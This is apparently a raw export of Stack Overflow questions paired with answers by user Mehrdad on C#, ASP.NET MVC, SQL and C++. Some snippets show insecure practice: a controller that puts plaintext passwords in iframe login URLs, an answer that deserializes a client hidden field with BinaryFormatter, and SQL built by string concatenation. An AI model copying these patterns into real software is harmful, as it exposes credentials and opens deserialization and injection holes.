<p>Literally, he's building the query in a string and passing it on for another function to execute unaltered.</p>

<pre><code>'VB6
strSQL = ""SELECT * FROM "" &amp; strTableName &amp; "" WHERE 1 &lt;&gt; 1""
</code></pre>

<p>In this case strTableName contains the name of a view.</p>

<p><strong>Update 3:</strong><br />
For reference, here is one of the views I'm having problems with 
(I've changed the field/table/schema names)</p>

<pre><code>CREATE OR REPLACE FORCE VIEW scott.foo (field1,
                                        field2,
                                        field4,
                                        field5,
                                        field12,
                                        field8,
                                        field6,
                                        field7,
                                        field16,
                                        field11,
                                        field13,
                                        field14,
                                        field15,
                                        field17
                                       )
AS
   SELECT   bar.field1,
            bar.field2,
            DECODE
               (yadda.field9, NULL, 'N',
                DECODE (yadda.field3, NULL, 'Y', 'N')
               ) AS field4,
            bar.field5,
            snafu.field6,
            DECODE
                (snafu.field6,
                 NULL,
                bar.field8,
                   bar.field8
                 - snafu.field6
                ) AS field7,
            DECODE
               (yadda.field10,
                NULL,
            bar.field12,
                yadda.field10
               ) AS field11,
            DECODE
               (SIGN (  yadda.field10 - bar.field12),
                NULL, 'N', 1, 'N', 0, 'N', -1, 'Y'
               ) AS field13,
            bar.field14,
            ADD_MONTHS
               (DECODE (yadda.field10, NULL, bar.field12, yadda.field10
                       ),
                bar.field14 * 12
               ) AS field15,
       FROM clbuttic,
            bar,
            yadda,
            snafu
      WHERE clbuttic.asset_type = bar.asset_type
        AND bar.field16 = yadda.field9(+)
        AND bar.field1 = snafu.field1(+)
        AND (bar.field17 IS NULL)
   ;
</code></pre>

<p>Appending <code>Order By 1</code> (or some column name in the select on foo) seems to convince Oracle to give me back the empty set. It's a long term solution, but not a short term one (changing he code and redeploying is a major PITA). I'm hoping there's a little known setting on the DB side or something wrong in the View that is the cause of this odd behaviour.</p>
","33708","Mehrdad","<p>When you want to dynamically generate a <code>WHERE</code> clause. This way, you could just append some <code>OR [another-condition]</code> clauses and make it work without checking whether the condition is the first one or not.</p>
"
"<p>Is there any way to have ThreadStatic variables be transferred from one thread to another?  I have a bunch of ThreadStatic variables, and now that I am converting my operation to be asynchronous, I want to be able to ""transfer"" them from the first thread (where they are set) to the callback thread (where they will be read).  Is this possible?</p>
","33708","Mehrdad","<p>If you need to do so, you probably don't want them to be <code>ThreadStatic</code>. You could make a static <code>Dictionary&lt;int,VarType&gt;</code> and map thread IDs to variables. </p>
"
"<p>We're using .NET MVC, and we're trying to dynamically (through the controller) set the iFrame's URL.  This worked fine on FireFox and Chrome, but not Ie.  On Ie only the first case site lets the user log through correctly.  The v10 and v9 sites don't.  All sites use querystring params to log in.  Their source looks like this (unsuccessful source in IE) - no visible difference.</p>

<ul>
<li><p>Also, we tried that whole IE7 Security setting Enabled for navigating to frame within another domain - that wasn't the problem; it still doesn't work. Also doesn't work on IE6. Same results as in the screenshots below.</p></li>
<li><p>Also Html Encoding hasn't worked (not shown, but tried).</p></li>
</ul>

<p>Any ideas would be so awesome!</p>

<pre><code>&lt;html xmlns=""http://www.w3.org/1999/xhtml"" &gt;
&lt;head id=""Head1""&gt;&lt;title&gt;

&lt;/title&gt;
&lt;style type=""text/css""&gt;
        td  {
              font-family: Arial;
              font-size: small;
        }
  &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action=""/Account/Navigate"" method=""post""&gt;
    &lt;table style=""align: right; width: 100%;""&gt;
        &lt;tr&gt;
            &lt;td align=""right""&gt;
                &lt;input type=""submit"" name=""butSubmit"" value=""WN"" /&gt;&amp;nbsp;

                    &lt;input type=""submit"" name=""butSubmit"" value=""MyDg"" /&gt;

                    &lt;input type=""submit"" name=""butSubmit"" value=""V9"" /&gt;

             &lt;/td&gt;
        &lt;/tr&gt;
    &lt;/table&gt;

        &lt;iframe id=""displayFrame"" src=""http://my.totallyinsecuretopostthis.com/Login.aspx?&amp;uname=sdavis&amp;pword=04ab"" style=""width: 100%; height: 95%;""&gt;&lt;/iframe&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<hr>

<p>successful source in IE7:</p>

<pre><code>&lt;html xmlns=""http://www.w3.org/1999/xhtml"" &gt;
&lt;head id=""Head1""&gt;&lt;title&gt;

&lt;/title&gt;
&lt;style type=""text/css""&gt;
            td  {
                    font-family: Arial;
                    font-size: small;
            }
    &lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;form action=""/Account/Navigate"" method=""post""&gt;
    &lt;table style=""align: right; width: 100%;""&gt;
        &lt;tr&gt;
            &lt;td align=""right""&gt;
                &lt;input type=""submit"" name=""butSubmit"" value=""WN"" /&gt;

                    &lt;input type=""submit"" name=""butSubmit"" value=""MyDg"" /&gt;

                    &lt;input type=""submit"" name=""butSubmit"" value=""V9"" /&gt;

             &lt;/td&gt;
        &lt;/tr&gt;
    &lt;/table&gt;

        &lt;iframe id=""displayFrame"" src=""http://www.totallyinsecuretopostthis.com/users/428/login/700bc1c8d837f30fdbc03cfc03b58c02"" style=""width: 100%; height: 95%;""&gt;&lt;/iframe&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<hr>

<p>Code snippet (first View, then Controller):</p>

<pre><code>&lt;%@ Page Language=""C#"" Inherits=""System.Web.Mvc.ViewPage&lt;SingleSignOnUser&gt;"" %&gt;
&lt;%@ Import Namespace=""Wingnut.Data.Model""%&gt;

&lt;html xmlns=""http://www.w3.org/1999/xhtml"" &gt;
&lt;head id=""Head1"" runat=""server""&gt;
&lt;title&gt;&lt;/title&gt;
&lt;style type=""text/css""&gt;
    td  {
        font-family: Arial;
        font-size: small;
    }
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;% using (Html.BeginForm(""Navigate"", ""Account"", FormMethod.Post)) { %&gt;
    &lt;% TempData[""username""] = Model.WingnutUserEmail; %&gt;
    &lt;% TempData[""password""] = Model.PasswordHash; %&gt;
    &lt;table style=""align: right; width: 100%;""&gt;
        &lt;tr&gt;
            &lt;td align=""right""&gt;
                &lt;!-- always display this, but when click, make sure you are authenticated; else, prompt for correct 
                 wingnut password --&gt;
                &lt;input type=""submit"" name=""butSubmit"" value=""WN"" /&gt;&amp;nbsp;
                &lt;% if (Model.IsV10User()) { %&gt;
                    &lt;input type=""submit"" name=""butSubmit"" value=""MyDg"" /&gt;
                &lt;% } %&gt;
                &lt;% if (Model.IsV9User()) { %&gt;
                    &lt;input type=""submit"" name=""butSubmit"" value=""V9"" /&gt;
                &lt;% } %&gt;
             &lt;/td&gt;
        &lt;/tr&gt;
    &lt;/table&gt;
    &lt;% string url = ViewData[""iFrameURL""].ToString(); %&gt;
    &lt;% if (ViewData[""iFrameURL""].ToString() != ""popup"") { %&gt;
        &lt;iframe id=""displayFrame"" src=""&lt;%=ViewData[""iFrameURL""]%&gt;"" style=""width: 100%; height: 95%;""&gt;&lt;/iframe&gt;
    &lt;% } %&gt;
</code></pre>

<p>(now Controller code:)</p>

<pre><code>[AcceptVerbs(HttpVerbs.Post)]
public ActionResult Navigate(string butSubmit) {
    _service = new SSOUserService();
    SingleSignOnUser wnUser = _service.GetValidUser(TempData[""username""].ToString(), TempData[""password""].ToString());

    ViewData[""iFrameURL""] = ""http://www.usatoday.com"";

    try {
        //if you are supposed to bypass the intersect page...
        if (wnUser != null) {
            switch (butSubmit) {
                case ""WN"":
                    if (wnUser.IsWingnutUser())
                        ViewData[""iFrameURL""] = string.Format(""http://www.totallyinsecuretopostthis.com/users/{0}/login/{1}"", wnUser.WingnutId, wnUser.WingnutToken);
                    else {
                        // do popup to capture this person's correct, but uncaptured, Wingnut password
                        // try to authenticate, if can, save, and proceed
                        // else, give error message / popup finally
                        ViewData[""iFrameURL""] = ""popup"";
                        ViewData[""popupText""] = ""Oops. During the Totallyinsecuretopostthis's recent Single Sign On effort, we require that you enter your Totallyinsecuretopostthis"" +
                            ""password for us here one time only for authentication to SomePlace:"";
                    }
                    break;

                case ""MyDg"":
                    if (wnUser.IsV10User()) {
                        ViewData[""iFrameURL""] =
                            string.Format(@""http://my.totallyinsecuretopostthisv10.com/Login.aspx?&amp;uname={0}&amp;pword={1}"",
                                          wnUser.V10UserCredentials.LoginName,
                                          wnUser.V10UserCredentials.Password);
                    }
                    break;

                case ""V9"":
                    if (wnUser.IsV9User()) {
                        ViewData[""iFrameURL""] =
                            string.Format(
                                @""https://login.totallyinsecuretopostthisv9.com/clients/OtherPages/ExternalSignIn.aspx?UserName={0}&amp;Password={1}"",
                                wnUser.V9UserCredentials.LoginName, wnUser.V9UserCredentials.Password);
                    }
                    break;
            }
        }
    }

    catch (Exception ex) {
        ModelState.AddModelError(""Errors"", ex.Message);
    }

    return View(""Navigation"", wnUser);
}
</code></pre>

<hr>
","33708","Mehrdad","<p>Use <code>HttpUtility.HtmlAttributeEncode</code> to encode the ampersand in the URL:</p>

<pre><code>ViewData[""iFrameUrl""] = HttpUtility.HtmlAttributeEncode( string.Format( ... ) );
</code></pre>

<p>I would suggest doing it while rendering the <code>&lt;a&gt;</code> tag in the view instead of hardcoding it in the controller.</p>
"
"<p>For pupose of explaining let's say that I have a Company object which has an Address property of type Address. so it would be something like:</p>

<pre>
public class Company  
{  
    Address CompanyAddress;
}  

public class Address  
{
    int Number;
    string StreetName;  
}
</pre>

<p>Now I have a method that works with any kind of object type and I want to get a specific property from the received object, so I'm trying the following:</p>

<pre>
public string MyMethod(object myObject, string propertyName)
{
    Type objectType = myObject.GetType();
    object internalObject = objectType.GetProperty(""Address"");

    Type internalType = internalObject.GetType();
    PropertyInfo singleProperty = internalType.GetProperty(""StreetName"");

    return singleProperty.GetValue(internalObject, null).ToString();
}
</pre>

<p>The problem is that internalType is never Address but ""System.Reflection.RuntimePropertyInfo"" so singleProperty is always null;</p>

<p>How can I accomplish this?</p>

<p>Thank you.</p>
","33708","Mehrdad","<p>The problem with your code is that <code>internalObject</code> will be the <code>PropertyInfo</code> object returned by <code>GetProperty</code> method. You need to get the actual value of that property, hence the call to <code>GetValue</code> method.</p>

<pre><code>public string MyMethod(object myObject, string propertyName) {
    Type objectType = myObject.GetType();
    object internalObject = objectType.GetProperty(""Address"").GetValue(myObject, null);

    Type internalType = internalObject.GetType();
    PropertyInfo singleProperty = internalType.GetProperty(""StreetName"");

    return singleProperty.GetValue(internalObject, null).ToString(); 
}
</code></pre>
"
"<p>Hello I'm writing a little project in c++ where I would like to have some classes that does some work, I wrote the interfaces and the implementation of the classes.</p>

<p>The thing that surprises me is that I cannot have a simple class without a main(), I would like to have a class that once instantiated, It's methods can be called, do things, but I don't need (nor want) a main() in the class implementation.
Here's an example I have in my head of what I'd like to have:</p>

<p>file animal.h:</p>

<pre><code>class animal
{
 public: 
   animal();
  ~animal();

 public:
   int method1(int arg1);

 private:
   int var1;
};
</code></pre>

<p>file animal.cpp:</p>

<pre><code>#include ""animal.h""

animal::animal(){...}
animal::~animal(){...}
int animal::method1(int arg1){return var1;}
}
</code></pre>

<p>And I would like to call the animal class form another file and have it work, something like this:
file app.cpp:</p>

<pre><code>#include &lt;neededlib&gt;
#include ""animal.h""

int main()
{
 animal dog;
 cout &lt;&lt; dog.method1(42);
 return 0;
}
</code></pre>

<p>But compiler give me </p>

<pre><code>/usr/lib/gcc/i686-pc-linux-gnu/4.3.3/../../../crt1.o: In function _start:

""(.text+0x18): undefined reference to `main`""

collect2: ld returned 1 exit status 
</code></pre>

<p>for animal.cpp, but I don't need a main there, or do I need it?</p>

<p>Where Am I wrong? </p>
","33708","Mehrdad","<p>You should either compile them together (in a single <code>g++</code> command) or compile both of them to object files (<code>g++ -c</code>) and then use <code>ld</code> to link the object files together.</p>

<p>Sample Makefile:</p>

<pre><code>all: app.exe

app.exe: app.o animal.o
    g++ -o app.exe app.o animal.o

app.o: app.cpp
    g++ -c -o app.o app.cpp

animal.o: animal.cpp animal.h
    g++ -c -o animal.o animal.cpp
</code></pre>
"
"<p>I wrote the following code to extract out the exceptions along with a string key referencing the property from the ViewData.Modelstate property in ASP.Net MVC. I think it should be possible to do this with a Linq expression but it utterly flummoxed me.</p>

<pre><code>       var exceptions = new Dictionary&lt;string, Exception&gt;();
       foreach (KeyValuePair&lt;string, ModelState&gt; propertyErrorsPair in ViewData.ModelState)
       {
           foreach (var error in propertyErrorsPair.Value.Errors)
           {
               if (error.Exception != null)
               {
                   exceptions.Add(propertyErrorsPair.Key, error.Exception);
               }
           }
       }
</code></pre>

<p>So is there a Linq way of doing this? I'm guessing it might have something to do with SelectMany but as I say I couldn't quite work out how to achieve this.</p>

<p>Thanks</p>
","33708","Mehrdad","<p>This is the equivalent LINQ expression:</p>

<pre><code>var result = ViewData.ModelState.SelectMany(x =&gt; x.Value.Errors
   .Where(error =&gt; error.Exception != null)
   .Select(error =&gt; new KeyValuePair&lt;string, Exception&gt;(x.Key, error.Exception)));
</code></pre>
"
"<p>I have several entity classes that I use for parsing fixed width text files as well as utilizing Linq to SQL. I use these classes to parse data from said text files, and compare to data in the database.</p>

<p>One of these entities has a lot of properties, and I don't want to waste time setting each individual property on the Linq result object. </p>

<p>Is there a way to tell Linq ""Here's my object, use this to update the record""? Here's code I'm working on:</p>

<pre>
if (partialContent.MonthlyAddChange == ""A"")
   {
       bookContentTable.InsertOnSubmit(partialContent);
   }
   else if (partialContent.MonthlyAddChange == ""C"")
   {
       var query = from bookContent in bookContentTable
                   where bookContent.EAN == partialContent.EAN
                   select bookContent;

       if (query != null)
       {
           // Do something with query.First()
       }
   }
}
</pre>

<p>Is it better to delete the record and do an InsertOnSubmit() in this case?</p>
","33708","Mehrdad","<p>I think the concept of <em>editing a record</em> is different from <em>deleting and inserting</em> a new one. Basically, I think an ORM should abstract away primary key generation and other related stuff. By deleting and inserting, you might be removing the integrity of the record (probably issuing a new primary key, making referenced entities invalid and so forth...). I suggest updating the record whenever the action you are taking is <em>conceptually an update</em>.</p>
"
"<p>I have a vague recollection of hearing about a profiling tool that could sit and watch the SQL Server that is serving data to my production website.  In particular, I'm looking for a tool that can, based on profiling what is actually taking the most time, do things like make suggestions for new indexes or other sorts of simple optimizations.</p>

<p>What tool can do this?</p>
","33708","Mehrdad","<p><a href=""http://msdn.microsoft.com/en-us/library/ms173494.aspx"" rel=""nofollow"">Database Engine Tuning Advisor</a> and <a href=""http://msdn.microsoft.com/en-us/library/ms181091.aspx"" rel=""nofollow"">SQL Profiler</a> are the way to go.</p>

<p>If you are using SQL Server 2000, you could use <a href=""http://msdn.microsoft.com/en-us/library/cc966541.aspx"" rel=""nofollow"">Index Tuning Wizard</a> instead of DB Engine Tuning Advisor.</p>
"
"<p>What is the difference between add your imports inside the NameSpace or Outside. Is there a difference in the way assemblies are loaded?</p>

<pre><code>Using System;
namespace test
{

}
VS
namespace test
{
using System;

}
</code></pre>
","33708","Mehrdad","<p>Nope. <code>using</code> directive is absolutely a compile time thing. It will <em>not</em> affect the runtime behavior in anyway. It just help you not write the long fully qualified type names.</p>
"
"<p>This behavior is so bizarre that I don't even know how best to ask the question.</p>

<p>Given the following C# code snippet:</p>

<pre><code>public class Foo {
  private bool _value = true;

  // ...

  protected void Method()
  { 
    _value = true;
    if(!_value) {
      throw new Exception(""What the...?!?!"");
    }
  }
}
</code></pre>

<p>Attaching the Visual Studio debugger to an application executing a version of this code and stepping through the execution of <code>Method()</code> (using step into or step over), the <code>if</code> block is evaluated and the exception is thrown.  Setting a watch on the <code>_value</code> variable, I can see that the value of <code>_value</code> is <code>false</code> at the beginning of the method and does not change as I step over/into the assignment statement.  More interestingly, the exception is <em>not</em> thrown if I Continue execution (F5), though things still aren't working correctly.</p>

<p>I came across this when trying to figure out why NUnit test cases were working when run using ReSharper from within visual studio, but fail when run within the the NUnit GUI.  I attached the debugger to the NUnit GUI, set some breakpoints on the tests that were unexpectedly failing, found places where variables weren't being set properly which should be set based on the above-mentioned <code>_value</code> variable which is somewhat of a flag indicating whether stuff is dirty or not), and thus noticed the strange behavior where <code>_value</code> wasn't changing (the exception throwing thing was added later and verifies I was using the right compiled assemblies!).</p>

<p>So, how about it?  What could possibly explain the above-mentioned behavior?</p>
","33708","Mehrdad","<p>Another thread might affect the value of the field in a race condition.</p>
"
"<p>Is there any standard naming convention for VB.NET ? </p>

<p>Based your programming experiences, would like to share your naming convention for VB.NET ?</p>

<p>Are there any guides for this kind of good practice besides <a href=""http://www.codeplex.com/Wiki/View.aspx?ProjectName=guidanceExplorer"">patterns &amp; practices</a> Guidance Explorer and <a href=""http://www.guidanceshare.com/wiki/Main%5FPage"">Guidance Share</a> ?</p>

<p>Thanks. Happy Weekend.</p>
","33708","Mehrdad","<p>VB.NET shares the naming convention of the .NET Framework. PascalCase for types and public stuff, camelCase otherwise.</p>
"
"<p>I was reading about <a href=""http://msdn.microsoft.com/en-us/library/system.random.aspx"">Random.Next()</a> that for ""cryptographically secure random number suitable for creating a random password"" MSDN suggests <a href=""http://msdn.microsoft.com/en-us/library/system.security.cryptography.rngcryptoserviceprovider.aspx"">RNGCryptoServiceProvider Class</a></p>

<p>What the speed penality? There is some fastest way to get true random numbers?</p>

<p><em>EDIT:
With Random.Next() I get a new random number. And with...</em></p>

<pre><code>byte[] randomNumber = new byte[1];
RNGCryptoServiceProvider Gen = new RNGCryptoServiceProvider();
Gen.GetBytes(randomNumber);
int rand = Convert.ToInt32(randomNumber[0]);
</code></pre>

<p><em>I get a ""cryptographically secure random number""
I want know if the above code is fast compared with <strong>""Random.Next()""</strong> and if there is some fast way to get same results, ok?</em></p>
","33708","Mehrdad","<p>The rule of thumb when it comes to security and cryptography stuff:</p>

<h1><em>Never</em> write your own.</h1>

<p>Go with the standard way of doing it and avoid dangerous optimizations.</p>

<h3>Edit to address the updated question:</h3>

<p>Use <code>Random.Next</code> when you need statistically random numbers not used in security sensitive code and <code>RNGCryptoServiceProvider</code> in security sensitive code. It's not as fast as <code>Random.Next</code> but it has acceptable performance. You should benchmark to see the actual difference. It usually doesn't make sense to sacrifice security for performance.</p>
"
"<p>I'm working with a 3rd party API that is distributed as source code. This is great because I can fix things on my own, but I also receive lots of updates from the 3rd party.</p>

<p>I have my own svn repository for my code base that includes my version of the API. I get the official API updates by checking out a version from the 3rd party's svn repository.</p>

<p>Merging the changes is a painful process. Is there a better way to do this? Would this be easier with a distributed source control system?</p>
","33708","Mehrdad","<p>I don't think distributed version control systems will help much in your scenario as it seems you'll be the one doing the merging to your own repository. If the nature of the merge is the API and the code that depends on that API, nothing can help you much.</p>
"
"<p>What's a good data structure for use in MVC web applications to use to pass data into view to ensure standardization and keep the view as non-coder friendly as possible?</p>
","33708","Mehrdad","<p>Use a custom model class and keep it as non-coder friendly as possible :)<br />
How you construct the model class strongly depends on the specific page.</p>
"
"<p>I'm trying to decide on the best way to model a relationship of records in a relational database.  It's the classic friend/follow model:</p>

<p>~~~~</p>

<p>A User can have zero to many friends.<br />
A User can have zero to many followers.</p>

<p>Friends and followers are both Users themselves.</p>

<p>~~~~~</p>

<p>What's the best way to model this?</p>

<p>Thanks!</p>
","33708","Mehrdad","<p>Users (UserId, ...)<br />
Subscription (Subscriber, Publisher)<br />
Friendship (FirstUser, SecondUser)</p>

<pre><code>CREATE TABLE Users (
    UserID int not null primary key,
    ...
)

CREATE TABLE Subscription (
    Subscriber int not null references Users(UserID),
    Publisher int not null references Users(UserID),
    constraint ck_NotEqual check (Subscriber &lt;&gt; Publisher)
)

CREATE TABLE Friendship (
    FirstUser int not null references Users(UserID), 
    SecondUser int not null references Users(UserID),
    constraint ck_Order check (FirstUser &lt; SecondUser) -- since friendship is reflective
)
</code></pre>
"
"<p>i have a problem with asp.net mvc on windows 7... asp.net mvc RC was previously installed and i installed MVC rtm... it says âthe project type is not supported by this installationâ... is there anyway to register this project type in to visual studio or unregister the rc version?</p>
","33708","Mehrdad","<p>Uninstall every ASP.NET MVC installation (in control panel) and reinstall the final 1.0 release. If it didn't help, run Visual Studio command prompt as administrator and run:</p>

<pre><code>devenv /resetskippkgs
</code></pre>

<p>Not sure. Helped me once. I hope that works for you.</p>
"
"<p>I have the following situation... In a certain View, the user must select the initial hour, the final hour and the weekday. But, I can't save this informations to DB 'cause I need to save my whole page and I need the primary key of the primary table, but that's not the point.</p>

<p>So, while I don't save these data to DB, I'm saving to a Session. I was told to save to a cookie, but it appears that cookies have a size limit. So, I'm saving to a Session.</p>

<p>Buuuut, I was also told that I could save these informations (hours and weekday) to the user page, simulating a ASP.NET ViewState...</p>

<p>Does anyone know how to do this?? Does anyone know how to save temporarily these data withou using cookie or Session??</p>

<p>Thanks!!</p>
","33708","Mehrdad","<p>Hidden input fields won't help?</p>

<pre><code>&lt;%= Html.Hidden(...) %&gt;
</code></pre>

<p>Update (serializing an object to base64):</p>

<pre><code>var formatter = new BinaryFormatter();
var stream = new MemoryStream();
formatter.Serialize(stream, myObject); // myObject should be serializable.
string result = Convert.ToBase64String(stream.ToArray());
</code></pre>

<p>When you want to fetch it back:</p>

<pre><code>var formatter = new BinaryFormatter();
var stream = new MemoryStream(Convert.FromBase64String(hiddenFieldValue));
var myObject = (MyObjectType)formatter.Deserialize(stream);
</code></pre>

<p>Make sure you validate the data stored in the field when you use it as the client might change it. <code>ViewState</code> takes care of this automatically. </p>

<p><em>Side note:</em> ASP.NET uses <a href=""http://msdn.microsoft.com/en-us/library/system.web.ui.losformatter.aspx""><code>LosFormatter</code></a> instead of <code>BinaryFormatter</code> to serialize <code>ViewState</code> as it's more efficient or ASCII based serialization. You might want to consider that too.</p>
"
"<p>I want to send emails in HTML format. How can I use asp.net to generate HTML content for emails.</p>

<ol>
<li>Using output of .aspx page(Tried there was nothing in email body. Must be something in page that can't be used for email)</li>
<li>Using Webcontrol and get web control output and use it as email body.</li>
<li>Using custom http handler so can call handler to get email body.</li>
</ol>

<p>Can you please suggest what would be the best solution?</p>

<p>Some guide or sample reference would be great if know one.</p>

<p>Thanks for all answers:</p>

<p>I am implementing code below:</p>

<pre><code> string lcUrl = ""http://localhost:50771/webform1.aspx"";

        // *** Establish the request
        HttpWebRequest loHttp =
             (HttpWebRequest)WebRequest.Create(lcUrl);

        // *** Set properties
        //loHttp.Timeout = 10000;     // 10 secs
        loHttp.UserAgent = ""Code Web Client"";

        // *** Retrieve request info headers
        HttpWebResponse loWebResponse = (HttpWebResponse)loHttp.GetResponse();

        Encoding enc;
        try
        {
            enc = Encoding.GetEncoding(loWebResponse.ContentEncoding);
        }
        catch
        {
            enc = Encoding.GetEncoding(1252);
        }

        StreamReader loResponseStream =
           new StreamReader(loWebResponse.GetResponseStream(), enc);

        string lcHtml = loResponseStream.ReadToEnd();

        loWebResponse.Close();
        loResponseStream.Close();
</code></pre>
","33708","Mehrdad","<p>I think the ASPX file will make the most easy to edit mechanism. You can use </p>

<pre><code>var stream = new MemoryStream();
var textWriter = new StreamWriter(stream);
Server.Execute(""EmailGenerator.aspx"", textWriter);
</code></pre>

<p>to capture the output of that page. </p>

<p>I personally don't like any of your options. I would probably do it by using an HTML file (or a template stored in a database) and substituting something like <code>{{name}}</code> with the appropriate parameter.</p>
"
"<p>I have a typedef:</p>

<pre><code>typedef unsigned char MyType[2];
</code></pre>

<p>I pass it to a function and the result is FAIL! </p>

<pre><code>void f(MyType * m)
{
*m[0] = 0x55;
*m[1] = 0x66;
}

void main(void)
{
Mytype a;
a[0] = 0x45;
a[1] = 0x89;

f(&amp;a);
}
</code></pre>

<p>The manipulation of variable <code>a</code> in <code>main()</code> works on 1 byte indexing, so <code>a</code> is equal to {0x45, 0x89}. However in function <code>f</code> the indexing acts on 2 bytes (the <code>sizeof</code> the type).</p>

<p>So in function <code>f</code>, <code>*m[1]</code> in this instance is actually modifying memory out of bounds. </p>

<p>Why is this, what have I forgotten?</p>

<p>Thanks.</p>
","33708","Mehrdad","<p>Try:</p>

<pre><code>(*m)[1]
</code></pre>

<p>instead of <code>*m[1]</code></p>
"
"<p>I need to pass 2 parameters in a query string but would like them to appear as a single parameter to the user. At a low level, how can I concatinate these two values and then later separate them? Both values are Base64 encoded.</p>

<pre><code>?Name=abcyxz
</code></pre>

<p>where both abc and xyz are separate Base64 encoded strings. </p>
","33708","Mehrdad","<p>You should either use some separator or store the length of the first item.</p>
"
"<p>The last few days we see this error message in our website too much:</p>

<blockquote>
  <p>""Timeout expired. The timeout period
  elapsed prior to obtaining a
  connection from the pool.  This may
  have occurred because all pooled
  connections were in use and max pool
  size was reached.""</p>
</blockquote>

<p>We have not changed anything in our code in a while. I revised the code to check open connections which didn't close, but found everything to be fine.</p>

<ul>
<li><p>How can I solve this?</p></li>
<li><p>Do I need to edit this pool?</p></li>
<li><p>How can I edit this pool's max number of connections?</p></li>
<li><p>What is the recommended value for a high traffic website?</p></li>
</ul>

<p><hr /></p>

<h3>Update:</h3>

<p>Do I need to edit something in IIS?</p>

<h3>Update:</h3>

<p>I found that the number of active connections are anywhere from 15 to 31, and I found that the max allowed number of connections configured in SQL server is more than 3200 connections, is 31 too many or should I edit something in the ASP.NET configration?</p>
","33708","Mehrdad","<p>You can specify minimum and maximum pool size by specifying <code>MinPoolSize=xyz</code> and/or <code>MaxPoolSize=xyz</code> in the connection string. This cause of the problem could be a different thing however.</p>
"
"<p>We all know that generic List&lt;> does not box value types. Why on the following code snippet the rects[1] is not affected by Inflate method? </p>

<p>If there is no boxing and I want to afect the rect[1] I need to write three lines of code as it is shown - commented. Can someone please explain this?</p>

<pre><code>List&lt;Rectangle&gt; rects = new List&lt;Rectangle&gt;();

for (int i = 0; i &lt; 5; i++)
{
    rects.Add(new Rectangle(1, 1, 1, 1));
}

foreach (Rectangle item in rects)
{
    Console.WriteLine(item);
}

//Rectangle r = rects[1];
//r.Inflate(100, 100);
//rects[1] = r;

rects[1].Inflate(100, 100);

foreach (Rectangle item in rects)
{
    Console.WriteLine(item);
}
</code></pre>
","33708","Mehrdad","<p>Yes, the value of the <code>Rectangle</code> will be copied to your local variable if you do that.</p>

<p>It's not called boxing. It's just normal copying, since <code>Rectangle</code> is a value type.</p>
"
"<p>I've got some experience with ASP.NET MVC, but only with a web application where the content of the master page doesn't change. I've been wondering how you would handle a site where for example the menu (which is on the master page) is loaded from a database. Where would you load this data? </p>

<p>In WebForms, you would load the menu in the code-behind of the master page, or have the menu as a user control and do the loading in the code-behind of that. But where is this done in MVC? </p>

<p>Do you create a class that inherits from <code>Controller</code> that you use for all your Controllers and let that load the menu on every Action invocation (I don't know if that's possible, but it seems likely)?  </p>

<p>Or do you create a utility method that you call in every Action where you want it (because some Actions may only return a partial view that won't reload the menu), which - while not disastrous - seems a little tiresome. </p>

<p>Or would you sin against MVC and just load it in the master page's code-behind?</p>

<p>What's the best approach to this (of course not limited to my solutions)?  </p>
","33708","Mehrdad","<p><code>ActionFilter</code>s are used to intercept a request and do some processing. You could use them.</p>

<p><em>Is it a sin against the MVC pattern?</em></p>

<p>You are breaking the MVC pattern to some extent. But the higher level point is: does it provide much more value if you force yourself not to break it? I don't think that puts you in much trouble, so keep simplicity and maintainability in mind and choose the way you'd do it in your specific situation.</p>
"
"<p>C and C++ allows passing of structure and objects by value to function, although prevents passing arrays by values, why?</p>
","33708","Mehrdad","<p>In C/C++, internally, an array is passed as a pointer to some location, and basically, it <em>is</em> passed by value. The thing is, that copied value represents a memory address to the <em>same location</em>. </p>

<p>In C++, a <code>vector&lt;T&gt;</code> is copied and passed to another function, by the way.</p>
"
"<p>I have few files which I put in array. 
I shuffle the files so that it can be displayed in random order. 
How to know that array index 0 is actually image1.txt or image2.txt or image3.txt?
Thanks in advance.</p>

<pre><code>String[] a = {""image1.txt"",""image2.txt"",""image3.txt""};
List&lt;String&gt; files = Arrays.asList(a);
Collections.shuffle(files);
</code></pre>
","33708","Mehrdad","<p>I'm not sure what you are trying to do.</p>

<p>To access the first element of the shuffled list, use <code>files.get(0)</code>.</p>

<p>If you want to know where each element is gone, I suggest you take another approach to it. Create a list of integers from <code>0</code> to <code>a.length() - 1</code>, inclusive and shuffle that list. Then manually permute the array <code>a</code> to a new collection.</p>
"
"<p>I have the following code inside main method:</p>

<pre><code>List&lt;Rectangle&gt; rects = new List&lt;Rectangle&gt;();

for (int i = 0; i &lt; 5; i++)
{
    rects.Add(new Rectangle(1, 1, 1, 1));
}

foreach (Rectangle item in rects)
{
    Console.WriteLine(item);
}

rects[1].Inflate(100, 100);

foreach (Rectangle item in rects)
{
    Console.WriteLine(item);
}
</code></pre>

<p>In the presented code rects[1] remains unchanged. This is because indexer (which still is a special method) returned the <em>copy</em> of the rectangle structure. In this case the elements were located on <em>heap</em>. The indexer returned the new <em>copy</em> of the element by placing the new <em>copy</em> on the stack (since the Rectangle is a value type).</p>

<p>So far so good...</p>

<p>Later I have created an array of Rectangle structures in the Program class:</p>

<pre><code> Rectangle[] rect = new Rectangle[] { new Rectangle(1, 1, 1, 1), new Rectangle(1, 1, 1, 1) };
</code></pre>

<p>In the main method:</p>

<pre><code>Program p = new Program();

p.rect[1].Inflate(100, 100);

foreach (var item in p.rect)
{
    Console.WriteLine(item);
}
</code></pre>

<p>I expected the indexer of rect array also to return <em>copy</em> of the rectangle structure, but this time the original element (which was also located on the <em>heap</em>) was changed.</p>

<p>Why is that? Does the array indexer works in a different way?</p>

<p>Kind Regards
PK</p>
","33708","Mehrdad","<p>Yes. An array indexer represents the variable to be changed directly. An indexer is basically a method with an index parameter with syntactic sugar applied to it.</p>

<p>The same difference applies to fields and properties.</p>

<p>If you were returning a reference type from the indexer, it wouldn't make much a difference since it would refer to the same object nevertheless. But when you return a <code>struct</code> instance (or any value type for that matter), the value is copied when returned and you are trying to modify the copy, which is pretty much useless.</p>
"
"<p>Let me try to ask this question from a different angle.  </p>

